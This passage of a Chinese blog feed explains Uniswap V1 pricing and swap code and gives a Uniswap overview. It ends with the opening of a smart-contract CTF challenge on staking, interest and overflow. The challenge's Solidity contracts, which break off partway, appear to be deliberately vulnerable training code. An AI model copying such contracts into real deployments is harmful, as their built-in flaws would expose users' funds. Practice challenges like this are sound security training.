class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getInputPrice(input_amount: uint256, input_reserve: uint256, output_reserve: uint256)</span><br></pre></td></tr></table></figure><p>在确定池子中输入单位和输出单位的存量时，精确的输入数量能换出的输出数量。不难看出，该函数实现了这样一个公式：</p><script type="math/tex; mode=display">Output=Reserve_{Output}{Input*997 \over Input*997 + Reserve_{Input} * 1000}</script><p>输入单位的0.3%作为交易费用，剩下的输入进入池子。因此分母为更新后池子中输入单位的存量，分子为除去交易费用后的输入，分式表达的是’ 输入进入池子后’ 输入在池子中所占的份额。该分式乘以输出池子的存量即为输入对应的输出量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getOutputPrice(output_amount: uint256, input_reserve: uint256, output_reserve: uint256)</span><br></pre></td></tr></table></figure><p>在确定池子中输入单位和输出单位的存量时，精确的计算出一定的输出数量能换出的输入数量。不难看出，该函数实现的公式是由上面的式子变换而来：</p><script type="math/tex; mode=display">Input=Reserve_{Input}{Output*1000 \over 997 * (Reserve_{Output} - Output)} + 1</script><p>Uniswap提供价格查询的四个函数：</p><ul><li><code>getEthToTokenInputPrice</code></li><li><code>getEthToTokenOutputPrice</code></li><li><code>getTokenToEthInputPrice</code></li><li><code>getTokenToEthOutputPrice</code></li></ul><p>均在这两个函数的基础上进行实现。以<code>getEthToTokenInputPrice</code>为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def getEthToTokenInputPrice(eth_sold: uint256(wei)) -&gt; uint256:</span><br><span class="line">    assert eth_sold &gt; 0</span><br><span class="line">    token_reserve: uint256 = self.token.balanceOf(self)</span><br><span class="line">    return self.getInputPrice(as_unitless_number(eth_sold), as_unitless_number(self.balance), token_reserve)</span><br></pre></td></tr></table></figure><p>可以看出，在实现时向<code>getInputPrice</code>中传入的存量参数<code>&#123;input,output&#125;_reserve</code>分别是Exchange本身的ETH数量和Exchange在代币合约中记录的代币存量。</p><h3 id="兑换"><a href="#兑换" class="headerlink" title="兑换"></a>兑换</h3><h4 id="eth-gt-token"><a href="#eth-gt-token" class="headerlink" title="eth=&gt;token"></a>eth=&gt;token</h4><p>有了价格计算函数，ETH和代币间的互换就变得非常直观。</p><p>通过精确的ETH输入量（<code>eth_sold</code>）计算价格并交换代币。通过<code>getInputPrice</code>计算输出的代币数量。同样包含了<code>min_tokens</code>最小代币输出量和<code>deadline</code>的时间限制。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@private</span><br><span class="line">def ethToTokenInput(eth_sold: uint256(wei), min_tokens: uint256, deadline: timestamp, buyer: address, recipient: address) -&gt; uint256:</span><br><span class="line">    # check</span><br><span class="line">    assert deadline &gt;= block.timestamp and (eth_sold &gt; 0 and min_tokens &gt; 0)</span><br><span class="line">    # calculate output token</span><br><span class="line">    token_reserve: uint256 = self.token.balanceOf(self)</span><br><span class="line">    tokens_bought: uint256 = self.getInputPrice(as_unitless_number(eth_sold), as_unitless_number(self.balance - eth_sold), token_reserve)</span><br><span class="line">    assert tokens_bought &gt;= min_tokens</span><br><span class="line">    # transfer token to recipient</span><br><span class="line">    assert self.token.transfer(recipient, tokens_bought)</span><br><span class="line">    log.TokenPurchase(buyer, eth_sold, tokens_bought)</span><br><span class="line">    return tokens_bought</span><br></pre></td></tr></table></figure><p>通过精确的代币输出量（<code>tokens_bought</code>）计算价格并交换代币。通过<code>getOutputPrice</code>计算输入的ETH数量，并可能在ETH需求量小于用户发送量时产生Refund。同样包含了<code>min_tokens</code>最小代币输出量和<code>deadline</code>的时间限制。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">@private</span><br><span class="line">def ethToTokenOutput(tokens_bought: uint256, max_eth: uint256(wei), deadline: timestamp, buyer: address, recipient: address) -&gt; uint256(wei):</span><br><span class="line">    # check</span><br><span class="line">    assert deadline &gt;= block.timestamp and (tokens_bought &gt; 0 and max_eth &gt; 0)</span><br><span class="line">    # calculate input ETH</span><br><span class="line">    token_reserve: uint256 = self.token.balanceOf(self)</span><br><span class="line">    eth_sold: uint256 = self.getOutputPrice(tokens_bought, as_unitless_number(self.balance - max_eth), token_reserve)</span><br><span class="line">    # may have refund, also check (revert) if eth_sold &gt; max_eth</span><br><span class="line">    eth_refund: uint256(wei) = max_eth - as_wei_value(eth_sold, &#x27;wei&#x27;)</span><br><span class="line">    if eth_refund &gt; 0:</span><br><span class="line">        send(buyer, eth_refund)</span><br><span class="line">    # transfer token</span><br><span class="line">    assert self.token.transfer(recipient, tokens_bought)</span><br><span class="line">    log.TokenPurchase(buyer, as_wei_value(eth_sold, &#x27;wei&#x27;), tokens_bought)</span><br><span class="line">    return as_wei_value(eth_sold, &#x27;wei&#x27;)</span><br></pre></td></tr></table></figure><h4 id="token-gt-ETH"><a href="#token-gt-ETH" class="headerlink" title="token=&gt;ETH"></a>token=&gt;ETH</h4><p><code>tokenToEthInput</code>和<code>tokenToEthOutput</code>在实现上与上面两个函数基本一致。</p><h4 id="token-gt-token"><a href="#token-gt-token" class="headerlink" title="token=&gt;token"></a>token=&gt;token</h4><p>由于 ETH 被用作所有 ERC20 代币的公共对，因此它可以用作直接 ERC20 到 ERC20 交换的中介。例如，可以在一个交易所从 OMG 转换为 ETH，然后在一个交易中从 ETH 转换为 KNC。</p><p>要从 OMG 转换为 KNC（例如），买方调用<code>tokenToTokenSwap()</code>OMG 交换合约上的函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">contract Factory():</span><br><span class="line">    def getExchange(token_addr: address) -&gt; address: constant</span><br><span class="line"></span><br><span class="line">contract Exchange():</span><br><span class="line">    def ethToTokenTransfer(recipent: address) -&gt; bool: modifying</span><br><span class="line">    </span><br><span class="line">factory: Factory</span><br><span class="line"></span><br><span class="line">@public</span><br><span class="line">def tokenToTokenSwap(token_addr: address, tokens_sold: uint256):</span><br><span class="line">    exchange: address = self.factory.getExchange(token_addr)</span><br><span class="line">    fee: uint256 = tokens_sold / 500</span><br><span class="line">    invariant: uint256 = self.eth_pool * self.token_pool</span><br><span class="line">    new_token_pool: uint256 = self.token_pool + tokens_sold</span><br><span class="line">    new_eth_pool: uint256 = invariant / (new_token_pool - fee)</span><br><span class="line">    eth_out: uint256 = self.eth_pool - new_eth_pool</span><br><span class="line">    self.eth_pool = new_eth_pool</span><br><span class="line">    self.token_pool = new_token_pool</span><br><span class="line">    Exchange(exchange).ethToTokenTransfer(msg.sender, value=eth_out)</span><br></pre></td></tr></table></figure><p>其中<code>token_addr</code>是 KNC 代币的地址，<code>tokens_sold</code>是出售的 OMG 数量。此函数首先检查工厂以检索 KNC 交换地址。接下来，交易所将输入的 OMG 转换为 ETH。然而，该函数并没有将购买的 ETH 返还给买家，而是调用了KNC 交易所的payable 函数：<code>ethToTokenTransfer()</code></p><p><code>ethToTokenTransfer()</code>接收 ETH 和买家地址，验证调用是从注册表中的交易所进行的，将 ETH 转换为 KNC，并将 KNC 转发给原始买家。<code>ethToTokenTransfer()</code>功能相同，<code>ethToTokenSwap()</code>但有额外的输入参数<code>recipient: address</code>。这用于将购买的代币转发给原始买家而不是<code>msg.sender</code>，在这种情况下将是 OMG 交易所。</p><h4 id="swap-amp-transfer"><a href="#swap-amp-transfer" class="headerlink" title="swap&amp;transfer"></a>swap&amp;transfer</h4><p>在交易机制上，Uniswap V1实现了两种交易方式：Swap和Transfer。两者的唯一差别在于，Swap调用的接收者固定为交易发送者（即<code>msg.sender</code>），而Transfer调用可以额外指定一个接收者。通过如下函数对可以清晰地看出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@public</span><br><span class="line">@payable</span><br><span class="line">def ethToTokenSwapInput(min_tokens: uint256, deadline: timestamp) -&gt; uint256:</span><br><span class="line">    # &#x27;receipient&#x27; is msg.sender</span><br><span class="line">    return self.ethToTokenInput(msg.value, min_tokens, deadline, msg.sender, msg.sender)</span><br><span class="line"></span><br><span class="line">@public</span><br><span class="line">@payable</span><br><span class="line">def ethToTokenTransferInput(min_tokens: uint256, deadline: timestamp, recipient: address) -&gt; uint256:</span><br><span class="line">    assert recipient != self and recipient != ZERO_ADDRESS</span><br><span class="line">    # &#x27;receipient&#x27; is specified as parameter</span><br><span class="line">    return self.ethToTokenInput(msg.value, min_tokens, deadline, msg.sender, recipient)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 03.Uniswap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>00.uniswap_digest</title>
      <link href="/2023/06/23/03.Uniswap/00.uniswap_digest/"/>
      <url>/2023/06/23/03.Uniswap/00.uniswap_digest/</url>
      
        <content type="html"><![CDATA[<h1 id="uniswap-digest"><a href="#uniswap-digest" class="headerlink" title="uniswap_digest"></a>uniswap_digest</h1><h2 id="uniswap简介"><a href="#uniswap简介" class="headerlink" title="uniswap简介"></a>uniswap简介</h2><p>Uniswap协议是一个用来在以太坊区块链上交易加密货币（ERC-20代币）的点对合约系统，简单点说就是通过智能合约实现了一个去中心化的ERC-20代币的自动交易系统。</p><p>任何人都可以再uniswap上创立流动池，一个流动池由一个代币对构成。假如你有一个项目发行了tokenCQ代币，你就能够创立ETH/tokenCQ的TokenPair为你的代币供给流动性。</p><h2 id="相关名词解释"><a href="#相关名词解释" class="headerlink" title="相关名词解释"></a>相关名词解释</h2><ul><li><strong>DEX：</strong>去中心化交易所</li><li><strong>Uniswap Labs：</strong>负责开发Uniswap协议、网络接口的公司。</li><li><strong>The Uniswap Protocol：</strong>一个实现自动化做市商的智能合约全家桶，促进点对点做市和以太坊上ERC-20 token的交易的协议（即Uniswap核心技术，后续工作原理介绍也都是针对协议内容的解释）。</li><li><strong>The Uniswap Interface：</strong>为了方便使用Uniswap protocol而开发的网络接口，是与Uniswap protocol交互的众多方式之一（也可以直接与智能合约交互）。</li><li><strong>Uniswap Governance：</strong>一个Uniswap Protocol的民主治理系统（社区式治理方式，论坛模式）。</li></ul><h2 id="uniswap发展历史"><a href="#uniswap发展历史" class="headerlink" title="uniswap发展历史"></a>uniswap发展历史</h2><p>Uniswap诞生至今也不过两年多的时间，但是却创造了很多令人惊叹的记录：</p><ul><li>2018年11月2日，Uniswap公开宣布上线并部署到以太坊主网，推出第一个版本Uniswap v1，但这个v1版本只能算是一个新型去中心化交易方式的概念验证，可实用性并不强。</li><li>2020年1月31日，经过1年多的沉淀，Uniswap锁仓金额突破5000万美元，成为DeFi龙头。</li><li>2020年5月19日，Uniswap v2版本上线，增加了自由组合交易对、价格预言机、闪贷、最优化交易路径等功能，对v1版本进行了全面的技术升级。</li><li>2020年7月27日，Uniswap 24小时交易额突破1亿美元，DeFi在2020年迎来爆发式增长。</li><li>2020年8月7日，Uniswap官方宣布已完成1100万美元的A轮融资，由Andreessen Horowitz领投。</li><li>2020年8月31日，Uniswap锁仓金额突破10亿美元。</li><li>2020年9月1日，Uniswap总交易量超过100亿美元。</li><li>2020年9月3日，Uniswap锁仓金额突破20亿美元，距离10亿美元仅仅过了3天，可见市场之火爆。</li><li>2020年9月17日，Uniswap宣布其协议治理代币UNI已在以太坊主网上发布，针对每一个之前使用过Uniswap protocol的区块链地址空投400个UNI，UNI的持有者有对平台新的发展及改变的提议的投票权。</li><li>2021年5月5日，Uniswap v3版本上线，提供了集中流动性、多重收费层次、高级价格预言机、流动性预言机等技术升级，核心是提升资本效率，具体实现可关注另一篇文章<a href="https://zhuanlan.zhihu.com/p/448382469">Uniswap v3 设计详解</a>。有一点需要注意的是v1和v2版本都遵循的是GPL开源协议，但是v3使用的是Business Source License 1.1（有效时限GPL-2.0或更高版本的许可证）。该许可证将v3源代码在商业环境或生产环境中的使用期限限制为两年，届时它将永久转换为GPL许可证。</li></ul><h2 id="自动化做市商"><a href="#自动化做市商" class="headerlink" title="自动化做市商"></a>自动化做市商</h2><p>自动化做市商（Automated Market Maker，AMM），在开始介绍Uniswap之前，先来说说中心化的交易所是怎么交易的</p><p>在传统中心化交易所中，你以一个价格发出买单，系统会在order book寻找合适的卖单进行撮合成交，如果当前没有合适的对手单，则将新的订单暂存到order book中等待合适的对手单出现。买方===&gt;Order Book&lt;===卖方。</p><p>买方以自己希望买入的价格挂买单，进入订单薄下方并按价格从高到低排序，价格最高成为买1； 卖方以自己希望卖出的价格挂卖单，进入订单薄的上方并按价格从低到高排序，价格最低成为卖1；订单薄上方的买单和下方的卖单按顺序撮合成交，如果没有合适的对手单时，交易就不能完成，订单挂在订单薄上等待。这种模式下，如果买卖双方不够活跃，用户发出的买单或者卖单无法快速找到交易对手方进行撮合，就会出现长时间的挂单，交易效率低下，这时就出现了做市商</p><p>这个order book以中心系统的形式保存了所有买单、买单的信息，如下图所示：</p><div class="table-container"><table><thead><tr><th></th><th></th><th>Ask Price</th><th>Ask Size</th></tr></thead><tbody><tr><td></td><td></td><td>103</td><td>40</td></tr><tr><td></td><td></td><td>102</td><td>23</td></tr><tr><td></td><td></td><td>101</td><td>10</td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td>20</td><td>99</td><td></td><td></td></tr><tr><td>15</td><td>98</td><td></td><td></td></tr><tr><td>35</td><td>97</td><td></td><td></td></tr><tr><td>Bid Size</td><td>Bid Price</td><td></td></tr></tbody></table></div><p>在这种中心化交易平台上，每笔交易的撮合并不需要通过区块链，而是在中心化系统中实现，保证了交易的高并发和低时延，但如果平台上的买卖双方不够活跃，用户发出的买单或者卖单无法快速找到交易对手方进行撮合，就会出现长时间的挂单，交易效率低下，这时就出现了做市商。</p><p>做市商是指在传统证券市场上，由具备一定实力和信誉的独立证券经营法人作为特许交易商，不断向公众投资者报出某些特定证券的买卖价格（即双向报价），并在该价位上接受公众投资者的买卖要求，以其自有资金和证券与投资者进行证券交易。买卖双方不需等待交易对手出现，只要有做市商出面承担交易对手方既可达成交易。</p><p><img src="/2023/06/23/03.Uniswap/00.uniswap_digest/image-20230228001941354.png" alt="image-20230228001941354"></p><p>做市商通过做市制度来维持市场的流动性，满足公众投资者的投资需求。做市商通过买卖报价的适当差额来补偿所提供服务的成本费用，并实现一定的利润，但是在中心化平台中，买方/卖方并不确定做市商是否真的在区块链上有实际的资产（账户中的余额只是中心化数据库中的一个数字），而且用户的资产都保存在中心化交易所的钱包里，自己没有绝对的控制权，而中心化交易所也没接受任何监管机构的监管，很容易发生监守自盗的事件。</p><p>基于以上种种弊端，Uniswap提出了一种通过智能合约实现<strong>自动化做市商（Automated Market Maker，AMM）</strong>来与用户进行交易的去中心化交易协议，用户资产完全由自己控制，而智能合约中锁定的做市资产也是公开可查，是一种更安全透明的交易方式。</p><p><img src="/2023/06/23/03.Uniswap/00.uniswap_digest/image-20230228002047138.png" alt="image-20230228002047138"></p>]]></content>
      
      
      <categories>
          
          <category> 03.Uniswap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>40.质押&amp;利息&amp;溢出</title>
      <link href="/2023/06/23/00.security/40.%E8%B4%A8%E6%8A%BC&amp;%E5%88%A9%E6%81%AF&amp;%E6%BA%A2%E5%87%BA/"/>
      <url>/2023/06/23/00.security/40.%E8%B4%A8%E6%8A%BC&amp;%E5%88%A9%E6%81%AF&amp;%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="质押-amp-利息-amp-溢出"><a href="#质押-amp-利息-amp-溢出" class="headerlink" title="质押&amp;利息&amp;溢出"></a>质押&amp;利息&amp;溢出</h1><p>和本博客文章[security-02]差不多，改了一点</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>要求：check的score得到100分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.12;</span><br><span class="line">pragma experimental ABIEncoderV2;</span><br><span class="line">library SafeMath &#123;</span><br><span class="line">    function add(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">        uint256 c = a + b;</span><br><span class="line">        require(c &gt;= a, &quot;SafeMath: addition overflow&quot;);</span><br><span class="line"></span><br><span class="line">        return c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sub(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">        require(b &lt;= a, &quot;SafeMath: subtraction overflow&quot;);</span><br><span class="line">        uint256 c = a - b;</span><br><span class="line"></span><br><span class="line">        return c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mul(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">        if (a == 0) &#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uint256 c = a * b;</span><br><span class="line">        require(c / a == b, &quot;SafeMath: multiplication overflow&quot;);</span><br><span class="line"></span><br><span class="line">        return c;</span><br><span class="line">    &#125;</span><br><span class="line">    function div(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">        require(b &gt; 0, &quot;SafeMath: division by zero&quot;);</span><br><span class="line">        uint256 c = a / b;</span><br><span class="line"></span><br><span class="line">        return c;</span><br><span class="line">    &#125;</span><br><span class="line">    function mod(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">        require(b != 0, &quot;SafeMath: modulo by zero&quot;);</span><br><span class="line">        return a % b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract ERC20 &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    mapping (address =&gt; uint256) public _balances;</span><br><span class="line"></span><br><span class="line">    mapping (address =&gt; mapping (address =&gt; uint256)) public _allowances;</span><br><span class="line"></span><br><span class="line">    string public _name;</span><br><span class="line">    string public _symbol;</span><br><span class="line">    uint8 public _decimals;</span><br><span class="line"></span><br><span class="line">    constructor (string memory name, string memory symbol) public &#123;</span><br><span class="line">        _name = name;</span><br><span class="line">        _symbol = symbol;</span><br><span class="line">        _decimals = 18;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address account) public view returns (uint256) &#123;</span><br><span class="line">        return _balances[account];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address recipient, uint256 amount) public virtual returns (bool) &#123;</span><br><span class="line">        _transfer(msg.sender, recipient, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 amount) public virtual returns (bool) &#123;</span><br><span class="line">        _approve(msg.sender, spender, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) &#123;</span><br><span class="line">        _transfer(sender, recipient, amount);</span><br><span class="line">        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _transfer(address sender, address recipient, uint256 amount) internal virtual &#123;</span><br><span class="line">        require(sender != address(0), &quot;ERC20: transfer from the zero address&quot;);</span><br><span class="line">        require(recipient != address(0), &quot;ERC20: transfer to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">        _balances[sender] = _balances[sender].sub(amount);</span><br><span class="line">        _balances[recipient] = _balances[recipient].add(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _mint(address account, uint256 amount) internal virtual &#123;</span><br><span class="line">        require(account != address(0), &quot;ERC20: mint to the zero address&quot;);</span><br><span class="line">        _balances[account] = _balances[account].add(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _burn(address account, uint256 amount) internal virtual &#123;</span><br><span class="line">        require(account != address(0), &quot;ERC20: burn from the zero address&quot;);</span><br><span class="line">        _balances[account] = _balances[account].sub(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _approve(address owner, address spender, uint256 amount) internal virtual &#123;</span><br><span class="line">        require(owner != address(0), &quot;ERC20: approve from the zero address&quot;);</span><br><span class="line">        require(spender != address(0), &quot;ERC20: approve to the zero address&quot;);</span><br><span class="line">        _allowances[owner][spender] = amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ZT is ERC20(&quot;ZERO TOKEN&quot;, &quot;ZT&quot;)&#123;</span><br><span class="line">    //RULE 1</span><br><span class="line">    bytes32 constant RULE_WITHDRAW_WANT = keccak256(abi.encodePacked(&quot;withdraw&quot;));</span><br><span class="line"></span><br><span class="line">    //RULE 2</span><br><span class="line">    bytes32 constant RULE_NONE_WANT = keccak256(abi.encodePacked(&quot;depositByValue&quot;));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    constructor()public&#123;</span><br><span class="line">        _mint(msg.sender,10000000*10**18);</span><br><span class="line">    &#125;</span><br><span class="line">    function depositByWant(uint amount)external payable&#123;</span><br><span class="line">        // uint amount = _amount.mul(10**18);</span><br><span class="line">        require(msg.value&gt;=amount,&quot;you want to trick me?&quot;);</span><br><span class="line">        MkaheChange(msg.sender,amount,RULE_NONE_WANT);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint amount)external payable returns(bool)&#123;</span><br><span class="line">        // uint amount = _amount.mul(10**18);</span><br><span class="line">        require(balanceOf(msg.sender)&gt;=amount);</span><br><span class="line">        _balances[msg.sender] = _balances[msg.sender].sub(amount);</span><br><span class="line">        return MkaheChange(msg.sender,amount,RULE_WITHDRAW_WANT);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function MkaheChange(address to,uint amount,bytes32 ID)internal returns(bool)&#123;</span><br><span class="line">        if(ID==RULE_NONE_WANT)</span><br><span class="line">        &#123;</span><br><span class="line">            _balances[msg.sender]=_balances[msg.sender].add(amount);</span><br><span class="line">            return true;</span><br><span class="line">        &#125;else if(ID==RULE_WITHDRAW_WANT)&#123;</span><br><span class="line">            bool a;</span><br><span class="line">            (a,)=payable(to).call.value(amount)(&quot;&quot;);</span><br><span class="line">            require(a,&quot;withdraw fail&quot;);</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fallback()external payable&#123;</span><br><span class="line">        MkaheChange(</span><br><span class="line">            msg.sender,</span><br><span class="line">            msg.value,</span><br><span class="line">            RULE_NONE_WANT</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract stakepool&#123;</span><br><span class="line">    ZT public token;</span><br><span class="line">    uint  totalsupply;</span><br><span class="line">    string symbol;</span><br><span class="line">    mapping(address=&gt;uint)internal workbalance;</span><br><span class="line">    mapping(address=&gt;bool)public passed;</span><br><span class="line">    struct userInfo&#123;</span><br><span class="line">        uint amount;</span><br><span class="line">        uint duration;</span><br><span class="line">        uint startTime;</span><br><span class="line">    &#125;</span><br><span class="line">    mapping(address=&gt;userInfo)internal userDetails;</span><br><span class="line"></span><br><span class="line">    constructor()public&#123;</span><br><span class="line">        token =new ZT();</span><br><span class="line">        symbol = 